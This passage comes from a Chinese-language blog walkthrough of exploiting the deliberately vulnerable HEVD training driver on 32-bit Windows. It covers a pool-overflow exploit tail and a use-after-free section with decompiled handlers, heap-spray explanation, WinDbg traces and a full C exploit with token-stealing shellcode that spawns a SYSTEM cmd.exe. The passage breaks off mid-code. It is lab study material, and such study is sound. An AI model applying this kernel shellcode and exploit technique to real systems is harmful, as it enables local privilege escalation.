class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Started to alloc zero page...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(NtAllocateVirtualMemory(        <span class="comment">//通过NtAllocateVirtualMemory来申请0页内存空间</span></span><br><span class="line">		INVALID_HANDLE_VALUE,</span><br><span class="line">		&amp;Zero_addr,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;RegionSize,</span><br><span class="line">		MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_READWRITE)) || Zero_addr != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to alloc zero page!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Success to alloc zero page...\n&quot;</span>);</span><br><span class="line">	*(DWORD*)(<span class="number">0x60</span>) = (DWORD)&amp; ShellCode;        <span class="comment">//将0页+0x60偏移成员CloseProcedure设置为shellcode地址</span></span><br><span class="line"></span><br><span class="line">	Pool_Spray();</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22200f</span>, buf, (PoolSize + ModifySize), <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (Event_OBJECT[i]) CloseHandle(Event_OBJECT[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (init() == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to get HANDLE!!!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	shellcode();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Start to Create cmd...\n&quot;</span>);</span><br><span class="line">	CreateCmd();</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>待完成</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230814061317908.png" alt="image-20230814061317908"></p>
<h1 id="6-UAF-AllocateUaFObjectNonPagedPool"><a href="#6-UAF-AllocateUaFObjectNonPagedPool" class="headerlink" title="6.UAF-AllocateUaFObjectNonPagedPool"></a>6.UAF-AllocateUaFObjectNonPagedPool</h1><p>UAF：</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230814064851640.png" alt="image-20230814064851640"></p>
<p>将释放后未设置成NULL的指针称为悬空指针（dangling pointer），该处的内存没有进行回收，导致下次申请内存时再次使用该处内存，使得悬空指针可以访问修改过的内存</p>
<p>示例代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p1, *p2;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    *p1 = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: \t address:%X \t value=%d\n&quot;</span>, (<span class="type">int</span>)p1, *p1);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    *p2 = <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p2: \t address:%X \t value=%d\n&quot;</span>, (<span class="type">int</span>)p2, *p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: \t address:%X \t value=%d\n&quot;</span>, (<span class="type">int</span>)p1, *p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p1:      address:C25E40          value=<span class="number">100</span></span><br><span class="line">p2:      address:C25E40          value=<span class="number">50</span></span><br><span class="line">p1:      address:C25E40          value=<span class="number">50</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>p1</code>句柄指向的堆块即使被释放了但是句柄没有设置为NULL，进而被重新读取到这块被释放的内存</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>0x222013</code>到<code>0x22201B</code>分别是申请，使用和释放：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222013</span>u:</span><br><span class="line">    v6 = _DbgPrintEx;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">    v7 = AllocateUaFObjectNonPagedPoolIoctlHandler(Irp, v4);</span><br><span class="line">    v9 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x222017</span>u:</span><br><span class="line">    v6 = _DbgPrintEx;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">    v7 = UseUaFObjectNonPagedPoolIoctlHandler(Irp, v4);</span><br><span class="line">    v9 = <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x22201B</span>u:</span><br><span class="line">    v6 = _DbgPrintEx;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">    v7 = FreeUaFObjectNonPagedPoolIoctlHandler(Irp, v4);</span><br><span class="line">    v9 = <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x22201F</span>u:</span><br><span class="line">    v6 = _DbgPrintEx;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">    v7 = AllocateFakeObjectNonPagedPoolIoctlHandler(Irp, v4);</span><br><span class="line">    v9 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br></pre></td></tr></table></figure>

<p>漏洞就再释放的那里，释放了但是没有置NULL：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">FreeUaFObjectNonPagedPool</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">-1073741823</span>;</span><br><span class="line">  <span class="keyword">if</span> ( g_UseAfterFreeObjectNonPagedPool )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Freeing UaF Object\n&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">    ExFreePoolWithTag(g_UseAfterFreeObjectNonPagedPool, <span class="number">0x6B636148</span>u);</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从而导致在<code>UseUaFObjectNonPagedPool</code>函数执行的时候还是可以调用全局指针<code>g_UseAfterFreeObjectNonPagedPool</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">UseUaFObjectNonPagedPool</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0xC0000001</span>;</span><br><span class="line">  <span class="keyword">if</span> ( g_UseAfterFreeObjectNonPagedPool )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Using UaF Object\n&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p\n&quot;</span>, *g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Calling Callback\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *g_UseAfterFreeObjectNonPagedPool )</span><br><span class="line">      (*g_UseAfterFreeObjectNonPagedPool)();</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>AllocateUaFObjectNonPagedPool</code>函数给<code>g_UseAfterFreeObjectNonPagedPool</code>全局变量申请0x58大小的池空间（还有8字节的池头部，所以大小是0x60）；</li>
<li><code>UseUaFObjectNonPagedPool</code>函数执行全局变量指向的函数；</li>
<li><code>FreeUaFObjectNonPagedPool</code>函数释放全局指针；</li>
<li><code>AllocateFakeObjectNonPagedPool</code>函数也申请0x58的池空间，并将构造的数据写入该池空间。</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里用到了堆喷，<strong>堆喷的原理可以这样简单理解：</strong>假设有一个大小为n的内核pool chunk A，然后释放该chunk。当我们再次申请同样大小的chunk时，就有可能又会申请到A，只是概率较低，但是如果我们大量申请同样大小的chunk，就有很大的概率又申请到A空间。</p>
<p>exp在下面，断点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; bp HEVD!AllocateUaFObjectNonPagedPool</span><br><span class="line">kd&gt; bp HEVD!UseUaFObjectNonPagedPool</span><br><span class="line">kd&gt; bp HEVD!FreeUaFObjectNonPagedPool</span><br><span class="line">kd&gt; bp HEVD!AllocateFakeObjectNonPagedPool</span><br></pre></td></tr></table></figure>

<p>断在<code>AllocateUaFObjectNonPagedPool</code>，运行之后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd g_UseAfterFreeObjectNonPagedPool</span><br><span class="line">a9ddd014  <span class="number">875f</span>85e0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a9ddd024  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a9ddd034  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a9ddd044  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a9ddd054  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a9ddd064  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a9ddd074  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a9ddd084  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; dd <span class="number">875f</span>85e0 </span><br><span class="line">ReadVirtual: <span class="number">875f</span>85e0 not properly sign extended</span><br><span class="line"><span class="number">875f</span>85e0  a9de0418 <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line"><span class="number">875f</span>85f0  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line"><span class="number">875f</span>8600  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line"><span class="number">875f</span>8610  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line"><span class="number">875f</span>8620  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></span><br><span class="line"><span class="number">875f</span>8630  <span class="number">41414141</span> <span class="number">00414141</span> <span class="number">040b</span>000c <span class="number">6</span>d4d6956</span><br><span class="line"><span class="number">875f</span>8640  <span class="number">941773</span>a8 <span class="number">9</span>dcce910 a8e8be70 <span class="number">00000000</span></span><br><span class="line"><span class="number">875f</span>8650  <span class="number">00000000</span> <span class="number">85f</span>9f600 <span class="number">96</span>dff730 <span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>这时它的原有函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; u a9de0418</span><br><span class="line">ReadVirtual: a9de0418 not properly sign extended</span><br><span class="line">a9de0418 680a1ddea9      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (a9de1d0a)</span><br><span class="line">a9de041d 6a03            push    3</span><br><span class="line">a9de041f 6a4d            push    4Dh</span><br><span class="line">a9de0421 ff1504c0d9a9    call    dword ptr [HEVD!_imp__DbgPrintEx (a9d9c004)]</span><br><span class="line">a9de0427 83c40c          add     esp,0Ch</span><br><span class="line">a9de042a c3              ret</span><br><span class="line">a9de042b cc              int     3</span><br><span class="line">a9de042c 6a10            push    10h</span><br></pre></td></tr></table></figure>

<p>这时它的池块：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 875f85e0 </span><br><span class="line">Pool page 875f85e0 region is Unknown</span><br><span class="line">...</span><br><span class="line">*875f85d8 size:   60 previous size:   48  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>继续运行free后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 875f85e0 </span><br><span class="line">Pool page 875f85e0 region is Unknown</span><br><span class="line">...</span><br><span class="line">*875f85d8 size:   60 previous size:   48  (Free ) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>接下来继续运行<code>AllocateFakeObjectNonPagedPool</code>函数，堆喷之后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 875f85e0 </span><br><span class="line">Pool page 875f85e0 region is Unknown</span><br><span class="line">...</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这时可以看到，前4字节已经变成了shellcode的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd g_UseAfterFreeObjectNonPagedPool</span><br><span class="line">a9ddd014  875f85e0 00000000 00000000 00000000</span><br><span class="line">a9ddd024  00000000 00000000 00000000 00000000</span><br><span class="line">a9ddd034  00000000 00000000 00000000 00000000</span><br><span class="line">a9ddd044  00000000 00000000 00000000 00000000</span><br><span class="line">a9ddd054  00000000 00000000 00000000 00000000</span><br><span class="line">a9ddd064  00000000 00000000 00000000 00000000</span><br><span class="line">a9ddd074  00000000 00000000 00000000 00000000</span><br><span class="line">a9ddd084  00000000 00000000 00000000 00000000</span><br><span class="line">kd&gt; dd 875f85e0 </span><br><span class="line">875f85e0  00b71040 44434241 44434241 00000000</span><br><span class="line">875f85f0  00000000 00000000 00000000 00000000</span><br><span class="line">875f8600  00000000 00000000 00000000 00000000</span><br><span class="line">875f8610  00000000 00000000 00000000 00000000</span><br><span class="line">875f8620  00000000 00000000 00000000 00000000</span><br><span class="line">875f8630  00000000 00000000 040b000c 6d4d6956</span><br><span class="line">875f8640  941773a8 9dcce910 a8e8be70 00000000</span><br><span class="line">875f8650  00000000 85f9f600 96dff730 00000000</span><br><span class="line">kd&gt; u 00b71040 </span><br><span class="line">00b71040 53              push    ebx</span><br><span class="line">00b71041 56              push    esi</span><br><span class="line">00b71042 57              push    edi</span><br><span class="line">00b71043 90              nop</span><br><span class="line">00b71044 60              pushad</span><br><span class="line">00b71045 64a124010000    mov     eax,dword ptr fs:[00000124h]</span><br><span class="line">00b7104b 8b4050          mov     eax,dword ptr [eax+50h]</span><br><span class="line">00b7104e 8bc8            mov     ecx,eax</span><br></pre></td></tr></table></figure>







<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*FunctionPointer)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShellCode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		nop</span><br><span class="line">		pushad</span><br><span class="line">		mov eax, fs: [<span class="number">124</span>h] <span class="comment">// 找到当前线程的_KTHREAD结构</span></span><br><span class="line">		mov eax, [eax + <span class="number">0x50</span>] <span class="comment">// 找到_EPROCESS结构</span></span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span> <span class="comment">// edx = system PID(4)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 循环是为了获取system的_EPROCESS</span></span><br><span class="line">		find_sys_pid :</span><br><span class="line">					 mov eax, [eax + <span class="number">0xb8</span>] <span class="comment">// 找到进程活动链表</span></span><br><span class="line">					 sub eax, <span class="number">0xb8</span> <span class="comment">// 链表遍历</span></span><br><span class="line">					 cmp[eax + <span class="number">0xb4</span>], edx <span class="comment">// 根据PID判断是否为SYSTEM</span></span><br><span class="line">					 jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">					 <span class="comment">// 替换Token</span></span><br><span class="line">					 mov edx, [eax + <span class="number">0xf8</span>]</span><br><span class="line">					 mov[ecx + <span class="number">0xf8</span>], edx</span><br><span class="line">					 popad</span><br><span class="line">					 ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">CreateCmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	si.wShowWindow = SW_SHOW;</span><br><span class="line">	WCHAR wzFilePath[MAX_PATH] = &#123; <span class="string">L&quot;cmd.exe&quot;</span> &#125;;</span><br><span class="line">	BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (bReturn)</span><br><span class="line">		CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD recvBuf;</span><br><span class="line">	<span class="comment">// 获取句柄</span></span><br><span class="line">	HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Start to get HANDLE...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取句柄失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用 AllocateUaFObject() 函数申请内存</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Start to call AllocateUaFObject()...\n&quot;</span>);</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x222013</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用 FreeUaFObject() 函数释放对象</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Start to call FreeUaFObject()...\n&quot;</span>);</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22201B</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Start to write shellcode()...\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 申请假的chunk</span></span><br><span class="line">	<span class="type">char</span> fakechunk[<span 